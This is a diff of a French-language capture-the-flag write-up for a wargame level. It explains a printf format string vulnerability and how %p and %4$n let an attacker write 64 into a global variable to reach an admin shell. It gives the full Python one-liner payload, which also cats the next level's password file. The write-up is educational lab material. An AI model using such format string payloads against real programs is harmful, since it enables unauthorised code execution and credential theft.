@@ -10,12 +10,14 @@ On voit que la comparaison est faite par rapport à une variable globale m qui s
 On a fgets qui prend un input mais qui contrairement a gets est sécurisé et empêche les buffer overflow. Par contre printf est vulnérable aux Format string attack https://owasp.org/www-community/attacks/Format_string_attack. On peut utiliser le flag %n, qui écrit le nombre de caractères jusque-là par printf sur une adresse de la stack. Par défaut, %n prend l'adresse la plus "récente", mais on peut remonter en utilisant le format `%<num>$n`.
 
 Par exemple en lancant ./level3 avec %p %p on obtient
-0x200 0xb7fd1ac0
-Donc si on lance ./level 3 avec AAAA%n on va écrire 4 (nous avons écrit 4 A) à l'adresse 0x200. Avec AAAA%2$n on va écrire 4 à l'adresse 0xb7fd1ac0, et ainsi de suite...
 
-En utilisant AAAA et une dizaine de %p, on voit que les 4141 apparaissent a partir du 4ème %p. Donc on peut écrire l'adresse de la variable m en début de string, faire pointer %n sur le 4ème emplacement, ce qui nous permettra d'écrire une valeur sur m pour accéder au shell admin :
-\x8c\x98\x04\x08%4$n va écrire 4 à l'adresse de m (0x0804988c).
+`0x200 0xb7fd1ac0`
+
+Donc si on lance ./level 3 avec AAAA%n, printf va prendre l'adresse écrite au premier emplacement (0x200, donc) et va y écrire 4 (nous avons écrit 4 A). Avec AAAA%2$n on va écrire 4 à l'adresse 0xb7fd1ac0, et ainsi de suite...
+
+En utilisant AAAA et une dizaine de %p, on voit que les 4141 apparaissent a partir du 4ème %p. Donc on peut écrire l'adresse de la variable m en début de string pour que ce soit la que printf se rende, faire pointer %n sur le 4ème emplacement, ce qui nous permettra d'écrire une valeur sur m pour accéder au shell admin :
+`\x8c\x98\x04\x08%4$n` va écrire 4 à l'adresse de m (0x0804988c).
 
 Donc pour écrire 64, il suffit de rajouter 60 caractères après l'adresse:
 
-(python -c "print '\x8c\x98\x04\x08' + 'A' * 60 +  '%4\$n'"; echo 'cat /home/user/level4/.pass') | ./level3
+`(python -c "print '\x8c\x98\x04\x08' + 'A' * 60 +  '%4\\$n'"; echo 'cat /home/user/level4/.pass') | ./level3`
